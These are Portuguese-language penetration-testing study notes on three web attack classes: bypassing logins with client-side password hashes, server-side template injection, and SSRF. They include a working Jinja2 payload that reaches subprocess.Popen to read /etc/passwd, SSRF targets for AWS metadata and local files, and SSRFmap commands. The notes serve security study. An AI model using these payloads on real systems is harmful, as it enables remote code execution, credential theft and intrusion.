# Hash Client-Side Bypass Auth

## O que é?

Algumas aplicações geram o hash da senha **no navegador** (client-side) antes de enviar ao servidor. A intenção pode ser reduzir carga no servidor ou evitar que a senha trafegue em texto puro pela rede.

O problema: quando o cliente gera o hash, o hash **vira a senha real**. Se um atacante conseguir o hash (via SQLi, path traversal, XSS...), ele pode enviá-lo diretamente sem precisar saber a senha original.

## Como funciona o ataque

1. Você observa que a aplicação faz hash da senha no JavaScript antes de enviar
2. Consegue o hash da vítima (de um banco de dados vazado, path traversal, etc.)
3. Usa um cliente modificado para enviar aquele hash diretamente
4. O servidor valida o hash recebido como se fosse correto

**O resultado**: a comparação server-side com hash client-side oferece a mesma segurança de usar a senha sem hash nenhum.

## Como identificar

1. Abra o DevTools → Sources
2. Procure no JavaScript código como `md5(password)`, `sha256(input.value)` antes do envio do formulário
3. Intercepte a requisição no Burp e veja o valor do campo senha — se não for texto puro, provavelmente está hasheado

## Exemplo prático (inspirado em HTB Arctic)

- A aplicação usa ColdFusion e gera o hash da senha no cliente
- Um path traversal revela o arquivo com o hash armazenado
- Com o hash em mãos, é possível fazer login sem saber a senha

---
---

# Server-Side Template Injection (SSTI)

## O que é?

Template engines são usadas para renderizar páginas dinamicamente - por exemplo, exibir "Olá, João" quando o usuário está logado, usando um template como "Olá, {{ nome }}".

O SSTI acontece quando **entrada do usuário é inserida diretamente dentro de um template**, sem sanitização. O servidor processa o input como parte do template e executa o código injetado.

## Identificando SSTI

Teste clássico: injetar uma expressão matemática que o template engine avaliaria.

```
Payload: {{ 7 * 7 }}
Resposta esperada se vulnerável: 49
```

Se a página mostrar `49` em vez de `{{ 7 * 7 }}`, você tem SSTI.

## Identificando o template engine

Diferentes engines têm sintaxes diferentes. Use esse fluxo de detecção:

```
${7*7}     → Freemarker, Velocity
{{7*7}}    → Jinja2, Twig, Pebble
#{7*7}     → Mako
```

A folha de dicas do PortSwigger tem um diagrama completo para identificar a engine pela resposta.

## Exploração em Flask/Jinja2

```python
# Ver configurações do Flask
{{ config.items() }}

# Acessar o sistema de arquivos (RCE)
{{ ''.__class__.__mro__[1].__subclasses__()[287](['cat', '/etc/passwd'], stdout=-1).communicate()[0] }}
```

A explicação da cadeia:
- `''.__class__` → classe `str`
- `.__mro__` → mapa de herança (Method Resolution Order)
- `.__subclasses__()` → lista todas as subclasses carregadas no Python atual
- Você procura o índice do `subprocess.Popen` (varia por aplicação)

## Impacto

SSTI pode levar a **RCE (Remote Code Execution)** - execução arbitrária de comandos no servidor. É uma das vulnerabilidades mais críticas em aplicações web.

---
---

# Server-Side Request Forgery (SSRF)

## O que é?

O SSRF engana o servidor para que ele faça requisições em seu lugar. Em vez de o atacante fazer a requisição diretamente, ele instrui o servidor da vítima a fazer.

## Por que é perigoso?

O servidor geralmente tem acesso a recursos que estão bloqueados externamente:
- Serviços internos (`localhost`, `192.168.x.x`, `10.x.x.x`)
- Metadata de cloud (AWS: `169.254.169.254`)
- APIs internas de microsserviços sem autenticação

## Como funciona

A aplicação tem um parâmetro que aceita uma URL:
```
GET /produto?imagem=http://images.loja.com/produto1.jpg
```

O servidor busca essa URL e retorna o conteúdo. Um atacante muda para:
```
GET /produto?imagem=http://localhost/admin
```

O servidor acessa `localhost/admin` (que seria bloqueado se o atacante tentasse direto) e retorna o conteúdo.

## Exemplos de alvos internos

```
http://localhost/admin
http://127.0.0.1:8080/internal-api
http://192.168.1.1/router-admin
http://169.254.169.254/latest/meta-data/   ← AWS metadata
file:///etc/passwd                          ← leitura de arquivos locais
```

## Automação com SSRFmap

```bash
# Baixar a ferramenta
git clone https://github.com/swisskyrepo/SSRFmap

# Instalar dependências
pip install -r requirements.txt

# Interceptar a requisição no Burp e salvar em arquivo
# Executar o SSRFmap
python3 ssrfmap.py -r requisicao.txt -p page -m portscan
```

## Como encontrar pontos de SSRF

Procure por parâmetros que aceitam URLs:
- `url=`, `link=`, `src=`, `image=`, `page=`, `host=`, `fetch=`
- Webhooks, importação de arquivos, preview de URLs
- Integrações com serviços externos

## Dica: Protocol Smuggling

Em alguns casos é possível usar outros protocolos além de HTTP:
- `file://` → leitura de arquivos
- `gopher://` → envio de dados para serviços TCP
- `dict://` → consulta a serviços de dicionário
